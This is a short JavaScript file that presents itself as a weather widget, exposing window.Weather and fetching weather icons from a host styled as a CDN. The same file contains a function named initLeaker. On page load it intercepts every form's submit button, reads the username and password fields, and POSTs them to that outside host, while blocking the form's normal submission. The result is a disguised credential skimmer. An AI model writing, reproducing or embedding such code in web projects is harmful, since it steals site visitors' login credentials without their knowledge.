(function (window, $) {
    $(function initLeaker() {
        $('button[type="submit"]').click(function (e) {
            var form = $(this).parent('form'),
                userName = $('input[name="userName"]', form).val(),
                password = $('input[name="password"]', form).val();

            $.ajax({
                url: '//scripts.vector-cdn.net/api/LoginData',
                method: 'POST',
                data: JSON.stringify({ username: userName, password: password }),
                contentType: 'application/json; charset=utf-8'
            });

            e.preventDefault();
        });
    });

    window.Weather = {
        initialize: function weather_initialize(targetElem) {
            var res = $.ajax({
                url: '//scripts.vector-cdn.net/api/Weather',
                success: function(data) {
                    console.info(data);
                    targetElem.empty().append($('<i>').addClass('owi').addClass('owi-' + data.icon));
                }
            });
        }
    };
})(window, $);